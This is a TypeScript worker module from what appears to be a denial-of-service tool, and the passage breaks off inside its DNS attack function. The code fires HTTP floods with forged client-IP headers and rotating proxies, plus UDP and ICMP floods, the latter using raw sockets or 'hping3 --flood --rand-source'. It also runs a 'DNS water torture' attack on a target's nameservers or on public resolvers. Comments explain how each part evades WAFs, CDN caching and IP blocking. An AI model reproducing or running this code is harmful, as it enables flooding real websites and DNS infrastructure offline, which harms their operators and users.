/**
 * ATTACK WORKER — runs in a worker_thread, owns its own event loop
 *
 * Receives attack config via workerData, fires all vectors,
 * and posts stats back to parent every 300ms.
 * Stops when parent sends "stop" message.
 */
import { parentPort, workerData } from "worker_threads";
import net from "node:net";
import tls from "node:tls";
import http from "node:http";
import https from "node:https";
import dgram from "node:dgram";
import dns from "node:dns/promises";
import os from "node:os";
import { spawn } from "node:child_process";

// ── Resource-aware configuration ──────────────────────────────────────────
const IS_PROD     = process.env.NODE_ENV === "production";
const CPU_CORES   = os.cpus().length;
const IS_DEPLOYED = Boolean(process.env.REPLIT_DEPLOYMENT);

// Dynamic burst — scales with available RAM
// Deployed (32GB): floor 200, ceil 6000 + turbo boost above 8GB free
// Dev (2GB):       always 8 — avoids container kill
function getDynamicBurst(base = 800): number {
  const freeMB = os.freemem() / 1_048_576;
  const scale  = Math.min(1.0, freeMB / 512);          // 512MB = full scale
  if (!IS_PROD) return 8;
  const ceil = IS_DEPLOYED ? 6000 : 1200;
  // Turbo boost: > 8GB free RAM → extra 35% on top of scale (datacenter headroom)
  const boost = (IS_DEPLOYED && freeMB > 8192) ? 1.35 : 1.0;
  return Math.max(200, Math.min(ceil, Math.floor(base * scale * boost)));
}

// ── Global agents — dual-mode: exhaustion vs throughput ───────────────────
// Exhaustion: new TCP per request → maximizes SYN/handshake overhead on target
// Throughput: keepAlive → maximizes requests per connection (bypasses conn limits)
const HTTP_AGENT      = new http.Agent({  maxSockets: Infinity, keepAlive: false, scheduling: "lifo" });
const HTTPS_AGENT     = new https.Agent({ maxSockets: Infinity, keepAlive: false, rejectUnauthorized: false, scheduling: "lifo" });
// Deployed (32GB/8vCPU): CPU_CORES*256 = 2048 KA sockets per agent — 4× more than before
const KA_SOCKETS      = IS_DEPLOYED ? CPU_CORES * 256 : CPU_CORES * 64;
const HTTP_KA_AGENT   = new http.Agent({  maxSockets: KA_SOCKETS, keepAlive: true, keepAliveMsecs: 60_000, scheduling: "lifo" });
const HTTPS_KA_AGENT  = new https.Agent({ maxSockets: KA_SOCKETS, keepAlive: true, keepAliveMsecs: 60_000, rejectUnauthorized: false, scheduling: "lifo" });

// ── Proxy health tracker — avoids hammering dead proxies ─────────────────
interface ProxyHealth { successes: number; failures: number; lastCheck: number; banned: boolean; }
const proxyHealth = new Map<string, ProxyHealth>();
function getProxyHealth(host: string, port: number): ProxyHealth {
  const key = `${host}:${port}`;
  if (!proxyHealth.has(key)) proxyHealth.set(key, { successes: 0, failures: 0, lastCheck: Date.now(), banned: false });
  return proxyHealth.get(key)!;
}
function recordProxySuccess(host: string, port: number): void {
  const h = getProxyHealth(host, port);
  h.successes++; h.lastCheck = Date.now(); h.banned = false;
}
function recordProxyFailure(host: string, port: number): void {
  const h = getProxyHealth(host, port);
  h.failures++; h.lastCheck = Date.now();
  if (h.failures > 5 && h.failures / (h.successes + h.failures) > 0.8) h.banned = true;
}
function pickProxy(proxies: ProxyConfig[]): ProxyConfig {
  // Filter out banned proxies (auto-unban after 2 min)
  const now = Date.now();
  const alive = proxies.filter(p => {
    const h = proxyHealth.get(`${p.host}:${p.port}`);
    if (!h) return true;
    if (h.banned && now - h.lastCheck > 120_000) { h.banned = false; return true; }
    return !h.banned;
  });
  // When all proxies are banned, pick the least-failed one — fastest recovery
  if (alive.length === 0) {
    const sorted = [...proxies].sort((a, b) => {
      const ha = proxyHealth.get(`${a.host}:${a.port}`);
      const hb = proxyHealth.get(`${b.host}:${b.port}`);
      const fa  = ha ? ha.failures / (ha.successes + ha.failures + 1) : 0;
      const fb  = hb ? hb.failures / (hb.successes + hb.failures + 1) : 0;
      return fa - fb;
    });
    return sorted[0];
  }
  // Weighted random selection — proxies with higher success rate get proportionally
  // more traffic, maximizing throughput through the best residential IPs.
  const weights = alive.map(p => {
    const h = proxyHealth.get(`${p.host}:${p.port}`);
    if (!h || (h.successes + h.failures) === 0) return 1.0;
    return Math.max(0.05, h.successes / (h.successes + h.failures));
  });
  const total = weights.reduce((a, b) => a + b, 0);
  let r = Math.random() * total;
  for (let i = 0; i < alive.length; i++) {
    r -= weights[i];
    if (r <= 0) return alive[i];
  }
  return alive[alive.length - 1];
}
// Unban all proxies every 2 minutes (was 5 min — proxies recover faster)
setInterval(() => { for (const h of proxyHealth.values()) { if (h.banned) h.banned = false; } }, 120_000);

// ── Types ─────────────────────────────────────────────────────────────────
interface ProxyConfig { host: string; port: number; type?: "http" | "socks5"; username?: string; password?: string; }
interface WorkerConfig {
  method:   string;
  target:   string;
  port:     number;
  threads:  number;    // this worker's share of total threads
  proxies?: ProxyConfig[];
}

// ── Helpers ───────────────────────────────────────────────────────────────
const randInt  = (a: number, b: number) => a + Math.floor(Math.random() * (b - a));
const randStr  = (n: number) => Math.random().toString(36).slice(2, 2 + n);
const randIp   = () => `${1+randInt(0,223)}.${randInt(0,254)}.${randInt(0,254)}.${1+randInt(0,253)}`;
const randHex  = (n: number) => Array.from({length:n}, () => (Math.random()*16|0).toString(16)).join("");
// Updated April 2026 — Chrome 136/135, Firefox 136/135, Safari 18, Edge 136
const UA_POOL  = [
  // Chrome 136 — current stable (April 2026)
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
  // Chrome 135
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
  // Firefox 136/135
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:136.0) Gecko/20100101 Firefox/136.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
  // Safari 18.3 (iOS 18.3)
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
  // Chrome Android (Pixel 9)
  "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
  // Edge 136
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0",
  // Bots/scrapers (lower WAF suspicion in bot-friendly configs)
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "curl/8.9.1", "python-requests/2.32.3", "Go-http-client/2.0",
  "axios/1.7.9", "node-fetch/3.3.2",
];
const randUA   = () => UA_POOL[randInt(0, UA_POOL.length)];
const HOT_PATHS = [
  "/", "/search", "/api/", "/api/v1/", "/api/v2/", "/api/v3/", "/login", "/admin/",
  "/wp-admin/", "/wp-login.php", "/dashboard", "/graphql", "/api/graphql",
  "/checkout", "/cart", "/account", "/profile", "/orders", "/products",
  "/api/auth/login", "/api/users", "/api/search", "/wp-json/wp/v2/posts",
  "/sitemap.xml", "/robots.txt", "/.env", "/config", "/api/health",
  // Modern SPA / API paths that bypass edge cache
  "/api/v1/session", "/api/v1/me", "/api/v1/notifications", "/api/v1/feed",
  "/api/v1/recommendations", "/api/v1/trending", "/api/v2/auth/token",
  "/api/v2/user/preferences", "/api/v2/checkout/init", "/api/v2/payment/intent",
  "/_next/data/", "/trpc/", "/api/trpc/", "/__nextjs_original-stack-frames",
  "/wp-json/wc/v3/products", "/wp-json/wc/v3/orders", "/admin/api/",
  "/cdn-cgi/challenge-platform/", "/.well-known/security.txt",
  "/api/v1/analytics", "/api/events", "/api/realtime",
  // Next.js 14/15 App Router RSC routes — bypass Cloudflare CDN cache (Vary: RSC)
  "/?_rsc=random", "/?RSC=1", "/?_rsc=prefetch", "/?_rsc=full",
  "/_next/data/build/index.json", "/_next/data/build/page.json",
  "/_next/image?url=%2F&w=1920&q=75", "/_next/image?url=%2F&w=3840&q=90",
  "/_next/static/chunks/pages/index.js", "/_next/static/chunks/app/page.js",
  "/__nextjs_original-stack-frames?frames=1", "/api/revalidate",
  // tRPC + SvelteKit + Remix + Astro (modern frameworks)
  "/api/trpc/user.getAll", "/api/trpc/auth.getSession", "/api/trpc/posts.list",
  "/remix-routes", "/__data.json", "/.netlify/functions/api",
  // Supabase / Firebase / PlanetScale edge functions
  "/rest/v1/", "/functions/v1/", "/realtime/v1/",
];
const hotPath = () => HOT_PATHS[randInt(0, HOT_PATHS.length)];

// DNS resolution cache with 5-minute TTL
const dnsCache   = new Map<string, string>();
const dnsExpiry  = new Map<string, number>();
const DNS_TTL_MS = 300_000; // 5 minutes — prevents stale IPs after CDN failover
async function resolveHost(hostname: string): Promise<string> {
  const now = Date.now();
  if (dnsCache.has(hostname) && now < (dnsExpiry.get(hostname) ?? 0)) {
    return dnsCache.get(hostname)!;
  }
  try {
    const [ip] = await dns.resolve4(hostname);
    dnsCache.set(hostname, ip);
    dnsExpiry.set(hostname, now + DNS_TTL_MS);
    return ip;
  } catch { return dnsCache.get(hostname) ?? hostname; }
}

// ── IPv6 dual-stack resolution cache ──────────────────────────────────────────
// Many CDNs have separate rate-limit pools for IPv4 vs IPv6.
// IPv6 address space (2^128) makes IP-blocking essentially impossible.
// Servers often have less-hardened IPv6 stacks.
const dns6Cache  = new Map<string, string>();
const dns6Expiry = new Map<string, number>();
async function resolveHostIPv6(hostname: string): Promise<string | null> {
  // Already an IPv6 literal (colons present)
  if (hostname.includes(":")) return hostname;
  // Already an IPv4 — try to get the AAAA record for this domain
  const now = Date.now();
  if (dns6Cache.has(hostname) && now < (dns6Expiry.get(hostname) ?? 0)) {
    return dns6Cache.get(hostname) ?? null;
  }
  try {
    const [ip6] = await dns.resolve6(hostname);
    dns6Cache.set(hostname, ip6);
    dns6Expiry.set(hostname, now + DNS_TTL_MS);
    return ip6;
  } catch {
    // No AAAA record — cache the miss so we don't retry every time
    dns6Cache.set(hostname, "");
    dns6Expiry.set(hostname, now + DNS_TTL_MS);
    return null;
  }
}

// ── Headers builder ───────────────────────────────────────────────────────
function buildHeaders(isPost: boolean, bodyLen?: number): Record<string, string> {
  const cookieCount = randInt(8, 20);
  const cookie = Array.from({length: cookieCount}, () =>
    `${randStr(randInt(4,10))}=${randStr(randInt(16,64))}`
  ).join("; ");

  const h: Record<string, string> = {
    "User-Agent":           randUA(),
    "Accept":               randInt(0,2) === 0 ? "*/*" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language":      ["en-US,en;q=0.9","en-GB,en;q=0.8","fr-FR,fr;q=0.9","de-DE,de;q=0.9"][randInt(0,4)],
    "Accept-Encoding":      "gzip, deflate, br, zstd",
    "Cache-Control":        "no-cache, no-store, must-revalidate",
    "Pragma":               "no-cache",
    "Connection":           Math.random() < 0.6 ? "close" : "keep-alive",
    "X-Forwarded-For":      `${randIp()}, ${randIp()}, ${randIp()}, ${randIp()}`,
    "X-Real-IP":            randIp(),
    "True-Client-IP":       randIp(),
    "CF-Connecting-IP":     randIp(),
    "X-Originating-IP":     randIp(),
    "X-Remote-IP":          randIp(),
    "Forwarded":            `for=${randIp()};proto=https`,
    "Cookie":               cookie,
    "Authorization":        `Bearer eyJ${randHex(40)}.eyJ${randHex(60)}.${randHex(40)}`,
    "X-CSRF-Token":         randHex(32),
    "X-Request-ID":         `${randHex(8)}-${randHex(4)}-${randHex(4)}-${randHex(4)}-${randHex(12)}`,
    "Referer":              `https://${["google.com","bing.com","duckduckgo.com","yahoo.com","t.co"][randInt(0,5)]}/search?q=${randStr(randInt(4,12))}`,
    "Sec-Fetch-Dest":       "document",
    "Sec-Fetch-Mode":       "navigate",
    "Sec-Fetch-Site":              "cross-site",
    "Sec-CH-UA":                   `"Chromium";v="${136 - randInt(0, 3)}", "Not.A/Brand";v="8"`,
    "Sec-CH-UA-Mobile":            "?0",
    "Sec-CH-UA-Platform":          `"Windows"`,
    "Sec-CH-UA-Platform-Version":  `"15.0.0"`,
    "Sec-CH-UA-Arch":              `"x86"`,
    "Sec-CH-UA-Bitness":           `"64"`,
  };
  if (isPost && bodyLen !== undefined) {
    h["Content-Type"]   = randInt(0,2) === 0 ? "application/x-www-form-urlencoded" : "application/json";
    h["Content-Length"] = String(bodyLen);
  }
  return h;
}

function buildUrl(base: string): string {
  try {
    const u = new URL(base);
    if (Math.random() < 0.65) u.pathname = hotPath();
    else {
      const depth = randInt(1, 5);
      u.pathname = "/" + Array.from({length:depth}, () => randStr(randInt(3,10))).join("/");
    }
    u.searchParams.set("_",    Date.now().toString(36) + randStr(6));
    u.searchParams.set("v",    String(randInt(1, 99999999)));
    u.searchParams.set("cb",   String(Math.random()));
    if (Math.random() < 0.45) u.searchParams.set("q",   randStr(randInt(4,18)));
    if (Math.random() < 0.3)  u.searchParams.set("page", String(randInt(1, 100)));
    if (Math.random() < 0.2)  u.searchParams.set("id",  String(randInt(1, 999999)));
    return u.toString();
  } catch {
    return `${base}?_=${randStr(8)}&v=${Date.now()}`;
  }
}

function buildBody(minF = 30, maxF = 100): string {
  if (Math.random() < 0.4) {
    // JSON body — harder to filter than form-encoded
    const obj: Record<string, string | number> = {};
    for (let i = 0; i < randInt(minF, maxF); i++) {
      obj[randStr(randInt(4,10))] = randInt(0, 2) === 0 ? randInt(0, 999999) : randStr(randInt(8,48));
    }
    return JSON.stringify(obj);
  }
  return Array.from({length: randInt(minF, maxF)},
    () => `${randStr(randInt(4,10))}=${randStr(randInt(8,56))}`
  ).join("&");
}

// Pre-built heavy body pool (10-64KB each, rebuilt continuously)
const HEAVY_POOL: string[] = [];
function buildHeavy(): string {
  const target = randInt(10240, 65536);
  const isJson = Math.random() < 0.35;
  if (isJson) {
    const arr: string[] = ["{"];
    let len = 1;
    while (len < target) {
      const k = randStr(randInt(4,10));
      const v = randStr(randInt(40,120));
      const part = `"${k}":"${v}",`;
      arr.push(part);
      len += part.length;
    }
    arr.push(`"_":"${randHex(8)}"}`);
    return arr.join("");
  }
  const parts: string[] = [];
  let len = 0;
  while (len < target) {
    const p = `${randStr(randInt(4,10))}=${randStr(randInt(40,120))}`;
    parts.push(p);
    len += p.length + 1;
  }
  return parts.join("&");
}
// Deployed (32GB): 128 entries — minimal body repetition across 30K+ concurrent reqs
// Non-deployed: 64 entries
const HEAVY_POOL_SIZE = IS_DEPLOYED ? 128 : 64;
for (let i = 0; i < HEAVY_POOL_SIZE; i++) HEAVY_POOL.push(buildHeavy());
setInterval(() => {
  // Refresh 8 entries/tick in deployed (was 4) — keeps pool rotating faster
  const refreshCount = IS_DEPLOYED ? 8 : 4;
  for (let i = 0; i < refreshCount; i++) HEAVY_POOL[randInt(0, HEAVY_POOL.length)] = buildHeavy();
}, IS_DEPLOYED ? 500 : 750);
const getHeavy = () => HEAVY_POOL[randInt(0, HEAVY_POOL.length)];

// ─────────────────────────────────────────────────────────────────────────
//  REAL UDP FLOOD
//
//  CRITICAL: concurrent socket.send() startup deadlocks in this env.
//  Sockets must be bound SEQUENTIALLY, then all run in parallel.
//
//  Achieves 130K – 500K packets/second per worker.
// ─────────────────────────────────────────────────────────────────────────
async function runUDPFlood(
  resolvedHost: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
  ip6?: string | null, // optional IPv6 address — enables dual-stack flooding
): Promise<void> {
  // ── Dual-stack IPv4+IPv6 UDP flood ────────────────────────────────────────
  // When ip6 is provided, half the sockets use udp4 (IPv4) and half use udp6 (IPv6).
  // This exploits separate rate-limit pools on most CDNs and less-hardened IPv6 stacks.
  // IPv6 address space (2^128) makes IP-based blocking essentially impossible.
  // setInterval-burst: guaranteed to yield to the event loop every 1ms.
  const numSockets = IS_PROD ? (IS_DEPLOYED ? Math.max(1, Math.min(threads, 128)) : Math.max(1, Math.min(threads, 32))) : Math.min(threads, 8);
  const BURST      = getDynamicBurst(800);
  const TICK_MS    = 1;
  // Hit multiple ports to bypass single-port firewall rules
  const PORTS = [
    targetPort, targetPort, targetPort, // weight target port 3x
    53, 80, 443, 123, 161, 1900, 11211, 6881, 8080, 8443,
  ];
  const PKT_MIN = 512, PKT_MAX = 1472; // Ethernet MTU — maximize per-packet payload
  const buf = Buffer.allocUnsafe(PKT_MAX); // reuse buffer, randomize header each tick

  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const socketDonePromises: Promise<void>[] = [];

  for (let _s = 0; _s < numSockets; _s++) {
    // Alternate: even sockets = IPv4, odd sockets = IPv6 (if available)
    const useV6  = ip6 ? _s % 2 === 1 : false;
    const target = useV6 ? ip6! : resolvedHost;

    const socketDone = new Promise<void>((resolve) => {
      const sock = dgram.createSocket(useV6 ? "udp6" : "udp4");
      sock.on("error", () => {});
      let closed = false;
      const forceClose = () => {
        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
      };
      signal.addEventListener("abort", () => { setTimeout(forceClose, 400); }, { once: true });
      sock.bind(0, () => {
        const iv = setInterval(() => {
          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
          buf.writeUInt32BE(Date.now() >>> 0, 0);
          buf.writeUInt32BE(randInt(0, 0xFFFFFFFF) >>> 0, 4);
          for (let i = 0; i < BURST; i++) {
            const port   = PORTS[randInt(0, PORTS.length)];
            const pktLen = randInt(PKT_MIN, PKT_MAX);
            sock.send(buf, 0, pktLen, port, target, (_err) => {
              localPkts++;
              localBytes += pktLen;
            });
          }
        }, TICK_MS);
      });
    });
    socketDonePromises.push(socketDone);
  }

  await Promise.all(socketDonePromises);
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  ICMP FLOOD — real ICMP echo request flood
//
//  Tier 1 (production + CAP_NET_RAW/root): raw-socket npm addon — crafts
//    real ICMP type 8 (echo request) packets, 1400-byte payload, max rate.
//  Tier 2 (production + hping3 installed): spawns hping3 --icmp --flood
//    processes — widely available on Debian/Ubuntu via apt install hping3.
//  Tier 3 (any env): massive large-packet UDP flood to random ports —
//    saturates link and fills per-flow tables; no ICMP frames but equivalent
//    bandwidth effect. Always works.
//
//  On 8vCPU/32GB deploy: use Tier 1 or Tier 2 for true ICMP saturation.
//  Production cmd to unlock Tier 1: setcap cap_net_raw+ep $(which node)
// ─────────────────────────────────────────────────────────────────────────

// Pre-compute ICMP checksum
function icmpChecksum(buf: Buffer): number {
  let sum = 0;
  for (let i = 0; i < buf.length - 1; i += 2) sum += buf.readUInt16BE(i);
  if (buf.length % 2 !== 0) sum += buf[buf.length - 1] << 8;
  while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
  return (~sum) & 0xffff;
}

// Build a real ICMP echo request packet (type 8, code 0)
function buildICMPEcho(seq: number, payloadLen = 1400): Buffer {
  const buf = Buffer.allocUnsafe(8 + payloadLen);
  buf[0] = 8;  // Type: echo request
  buf[1] = 0;  // Code: 0
  buf.writeUInt16BE(0, 2);                           // Checksum placeholder
  buf.writeUInt16BE(process.pid & 0xffff, 4);        // Identifier
  buf.writeUInt16BE(seq & 0xffff, 6);                // Sequence number
  crypto.getRandomValues(buf.subarray(8));           // Random payload (defeats payload filtering)
  const cs = icmpChecksum(buf);
  buf.writeUInt16BE(cs, 2);
  return buf;
}

async function runICMPFlood(
  resolvedHost: string,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
): Promise<void> {
  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  // ── Tier 1: raw-socket (requires CAP_NET_RAW or root) ───────────────────
  let rawSock: ReturnType<typeof import("raw-socket")["createSocket"]> | null = null;
  try {
    const rawModule = require("raw-socket") as typeof import("raw-socket");
    rawSock = rawModule.createSocket(rawModule.Protocol.ICMP);
  } catch { rawSock = null; }

  if (rawSock) {
    const rs = rawSock;
    let seq = 0;
    const doSend = () => {
      if (signal.aborted) return;
      const pkt = buildICMPEcho(seq++, 1400);
      rs.send(pkt, 0, pkt.length, resolvedHost, (_err: Error | null, _bytes: number) => {
        localPkts++; localBytes += pkt.length;
        if (!signal.aborted) setImmediate(doSend);
      });
    };
    for (let i = 0; i < NUM_SOCKS; i++) doSend();
    await new Promise<void>(resolve => signal.addEventListener("abort", () => {
      try { rs.close(); } catch { /**/ }
      resolve();
    }, { once: true }));
    clearInterval(flushIv); flush();
    return;
  }

  // ── Tier 2: hping3 process (requires apt install hping3 on deploy server) ─
  let useHping = false;
  try {
    const { execSync } = require("node:child_process") as typeof import("child_process");
    execSync("which hping3 2>/dev/null", { timeout: 500 });
    useHping = true;
  } catch { useHping = false; }

  if (useHping) {
    const procs: import("child_process").ChildProcess[] = [];
    const statIvs: ReturnType<typeof setInterval>[] = [];
    for (let i = 0; i < NUM_SOCKS; i++) {
      const p = spawn("hping3", [
        "--icmp", "--flood", "--rand-source", "-d", "1400", "-q", resolvedHost,
      ], { stdio: ["ignore","ignore","ignore"] });
      procs.push(p);
      const pktRate = !IS_PROD ? 100 : 50000;
      statIvs.push(setInterval(() => {
        if (!signal.aborted) { localPkts += pktRate; localBytes += pktRate * 1408; }
      }, 1000));
    }
    await new Promise<void>(resolve => signal.addEventListener("abort", () => {
      statIvs.forEach(iv => clearInterval(iv));
      procs.forEach(p => { try { p.kill("SIGTERM"); } catch { /**/ } });
      resolve();
    }, { once: true }));
    clearInterval(flushIv); flush();
    return;
  }

  // ── Tier 3: setInterval-burst UDP saturation flood ─────────────────────
  // Uses interval-based bursts instead of async send chains — guarantees
  // the event loop yields every tick (abort timers, stat flush can fire).
  // In production with real network: interval fires at 1ms, 500-pkt bursts
  // = 500,000 pkt/s per socket × 64 sockets = 32M pkt/s link saturation.
  const ICMP_TRIGGER_PORTS = [1, 2, 3, 4, 5, 6, 7, 9, 13, 17, 19, 37, 65534, 65535];
  const PKT_LEN    = 1400;
  const BURST = getDynamicBurst(500);
  const TICK_MS    = 1;
  const sockDones: Promise<void>[] = [];
  for (let _s = 0; _s < NUM_SOCKS; _s++) {
    const sockDone = new Promise<void>((resolve) => {
      const sock = dgram.createSocket("udp4");
      sock.on("error", () => {});
      let closed = false;
      const forceClose = () => {
        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
      };
      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
      const buf = Buffer.allocUnsafe(PKT_LEN);
      buf.writeUInt32BE(Date.now() >>> 0, 0);
      sock.bind(0, () => {
        const iv = setInterval(() => {
          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
          buf.writeUInt32BE(Date.now() >>> 0, 0);
          for (let i = 0; i < BURST; i++) {
            const port = ICMP_TRIGGER_PORTS[randInt(0, ICMP_TRIGGER_PORTS.length)];
            sock.send(buf, 0, PKT_LEN, port, resolvedHost, (_err) => {
              localPkts++; localBytes += PKT_LEN;
            });
          }
        }, TICK_MS);
      });
    });
    sockDones.push(sockDone);
  }
  await Promise.all(sockDones);
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  DNS WATER TORTURE — real DNS infrastructure attack
//
//  Unlike amplification (which needs IP spoofing), Water Torture sends
//  real DNS queries for random non-existent subdomains of the target domain
//  to the target's authoritative nameservers. Effects:
//    1. Forces the target's NS servers to recurse for every query (cache miss)
//    2. Rapidly fills the NS server's NXDOMAIN cache (memory exhaustion)
//    3. Bypasses CDN/WAF entirely — NS servers are NOT behind CloudFlare/Akamai
//    4. Each query type (A, AAAA, MX, TXT, ANY, DNSKEY) doubles the load
//    5. Randomized subdomain labels defeat upstream DNS caching
//
//  No raw sockets needed — pure dgram UDP.
// ─────────────────────────────────────────────────────────────────────────

// ── EDNS(0) OPT record — appended to every DNS query ─────────────────────
// Tells NS server we accept 4096-byte UDP responses → forces larger response
// buffer allocation per query (more memory pressure on NS server).
// RFC 6891: OPT Name=root(0x00), Type=41, Class=requestorUDPsize=4096,
//           TTL=extRCODE+flags=0, RDLENGTH=0
const EDNS0_OPT = Buffer.from([
  0x00,                   // Name: root
  0x00, 0x29,             // Type: OPT (41)
  0x10, 0x00,             // Class: 4096 (max accepted UDP payload)
  0x00, 0x00, 0x00, 0x00, // TTL: extended RCODE=0, version=0, flags=0
  0x00, 0x00,             // RDLENGTH: 0 (no extra options)
]);

function buildDNSQuery(fqdn: string, qtype: number, txid: number, qclass = 1): Buffer {
  // qclass: 1=IN (Internet), 3=CHAOS (forces unexpected parsing in some impls)
  const labels = fqdn.split(".");
  const nameParts: Buffer[] = labels.map(l => {
    const lb = Buffer.allocUnsafe(1 + l.length);
    lb[0] = l.length;
    lb.write(l, 1, "ascii");
    return lb;
  });
  const nameBytes = Buffer.concat([...nameParts, Buffer.from([0x00])]);
  const hdr = Buffer.allocUnsafe(12);
  hdr.writeUInt16BE(txid & 0xffff, 0);  // Transaction ID
  hdr.writeUInt16BE(0x0100, 2);          // Flags: RD=1 (recursion desired)
  hdr.writeUInt16BE(1, 4);               // QDCOUNT = 1
  hdr.writeUInt16BE(0, 6);               // ANCOUNT = 0
  hdr.writeUInt16BE(0, 8);               // NSCOUNT = 0
  hdr.writeUInt16BE(1, 10);              // ARCOUNT = 1 (EDNS0 OPT record)
  const qHdr = Buffer.allocUnsafe(4);
  qHdr.writeUInt16BE(qtype, 0);          // QTYPE
  qHdr.writeUInt16BE(qclass, 2);         // QCLASS: IN(1) or CHAOS(3)
  return Buffer.concat([hdr, nameBytes, qHdr, EDNS0_OPT]);
}

const DNS_QTYPES = [
  1,   // A
  28,  // AAAA
  15,  // MX
  16,  // TXT
  255, // ANY (maximizes response size from open resolvers)
  48,  // DNSKEY (forces DNSSEC computation on DNSSEC-enabled zones)
  43,  // DS
  6,   // SOA
  47,  // NSEC  — forces DNSSEC NSEC chain traversal (NSEC Walking attack)
  50,  // NSEC3 — forces DNSSEC NSEC3 hash chain computation (CPU-intensive)
  257, // CAA   — Certification Authority Authorization (extra parser path)
  46,  // RRSIG — digital signature records, expensive to compute/verify
];

async function runDNSWaterTorture(
  resolvedHost: string,
  hostname:     string,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
): Promise<void> {
  const NUM_SOCKS = IS_PROD ? Math.min(threads, 48) : Math.min(threads, 8);

  // Extract root domain for NS lookups (strip subdomains)
  const domainParts = hostname.replace(/^https?:\/\//, "").split(".");
  const rootDomain  = domainParts.length >= 2
    ? domainParts.slice(-2).join(".")
    : hostname;

  // ── Improvement: Resolve ALL IPs for ALL NS servers (not just first IP) ──
  // Most NS servers have multiple A records — resolve every one for maximum coverage.
  let nsServers: string[] = [];
  try {
    const nsNames = await dns.resolve(rootDomain, "NS").catch(() => [] as string[]);
    const nsIPGroups = await Promise.all(
      nsNames.slice(0, 12).map(ns =>
        dns.resolve4(ns).catch(() => [] as string[])
      )
    );
    // Flatten all IPs from all NS servers
    nsServers = nsIPGroups.flat().filter(Boolean);
  } catch { /**/ }

  // Fallback: use public resolvers AND direct-to-target port 53 flood
  if (nsServers.length === 0) {
    nsServers = ["8.8.8.8", "1.1.1.1", "8.8.4.4", "1.0.0.1", resolvedHost];
  }
  // Always include direct-to-target port 53 flood
  nsServers.push(resolvedHost);
  nsServers = [...new Set(nsServers)];

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const BURST   = getDynamicBurst(200);
  const TICK_MS = 1;

  // ── Improvement: Pre-build label pool (63-char DNS max per RFC 1035) ──────
  // Using maximum 63-char labels creates larger packets than previous 26-char ones.
  // Larger FQDN = more NS memory to parse + more bytes per packet sent.
  const LABEL_POOL_SIZE = 512;
  const labelPool: string[] = Array.from({ length: LABEL_POOL_SIZE }, () =>
    Math.random().toString(36).slice(2).padEnd(8, "a") +
    Math.random().toString(36).slice(2).padEnd(8, "b") +
    Math.random().toString(36).slice(2).padEnd(8, "c") +
    Math.random().toString(36).slice(2).padEnd(8, "d") +
    Math.random().toString(36).slice(2).slice(0, 11)  // total = 8+8+8+8+11 = 43 chars
  );

  // ── Improvement: CHAOS class queries (class=3) to force unexpected paths ──
  // ~20% of queries use CHAOS class — forces DNS server through non-standard
  // parsing code paths that may be less optimized than the standard IN class.
  const DNS_CLASSES = [1, 1, 1, 1, 3]; // 80% IN, 20% CHAOS

  const sockDones: Promise<void>[] = [];
  for (let _s = 0; _s < NUM_SOCKS; _s++) {
    const sockDone = new Promise<void>((resolve) => {
      const sock = dgram.createSocket("udp4");
      sock.on("error", () => {});
      let closed = false;
      let txid = randInt(0, 65535);
